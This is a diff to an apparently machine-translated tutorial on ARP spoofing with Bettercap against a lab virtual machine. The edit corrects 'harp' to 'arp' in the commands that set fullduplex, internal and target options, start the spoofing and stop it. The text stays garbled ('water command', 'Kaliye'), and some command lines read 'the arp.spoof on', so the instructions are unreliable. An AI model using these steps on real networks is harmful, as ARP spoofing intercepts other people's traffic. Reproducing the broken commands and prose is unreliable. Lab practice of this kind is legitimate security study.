@@ -113,31 +113,31 @@ Let me explain to you what the terminal code we wrote does.
 
 16. First of all, we enter the help command. We are viewing the modules in Bettercap. and we're seeing what kind of attacks we can do.
 
-17. **harp.we are seeing the spoof** module. And to examine the arp spoof module "**help arp.we are entering the command "spoof**".
-The harp.commands in the spoof module "https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof /" you can review the commands by going to the link.
+17. **arp.we are seeing the spoof** module. And to examine the arp spoof module "**help arp.we are entering the command "spoof**".
+The arp.commands in the spoof module "https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof /" you can review the commands by going to the link.
 
 18. We'll make the attack, let's write the commands ;
 
 ``` bash
-set harp.spoof.fullduplex true
+set arp.spoof.fullduplex true
 ```
 
 Then we enter the water command.
 ``` bash
-set harp.spoof.internal true
+set arp.spoof.internal true
 ```
 
 And finally, we state our goal.
 ``` bash
-set harp.spoof.target TARGET_IP #192.168.237.133
+set arp.spoof.target TARGET_IP #192.168.237.133
 ```
 
-Now we can launch the Harp spoofing attack. enter the water command to start ;
+Now we can launch the arp spoofing attack. enter the water command to start ;
 ``` bash
-the harp.spoof on
+the arp.spoof on
 ```
 
-19. Our harp spoofing attack is taking place. Go to the virtual machine installed as a victim and type the water command on the **cmd** screen.
+19. Our arp spoofing attack is taking place. Go to the virtual machine installed as a victim and type the water command on the **cmd** screen.
 ``` shell
 arp -a
 ```
@@ -146,7 +146,7 @@ arp -a
 
 21. If you want to stop the attack, please come to Kaliye and run the water command in bettercap ;
 ``` shell
-the harp.spoof off
+the arp.spoof off
 ```
 22. After the written command, we ended the arp attack.
 
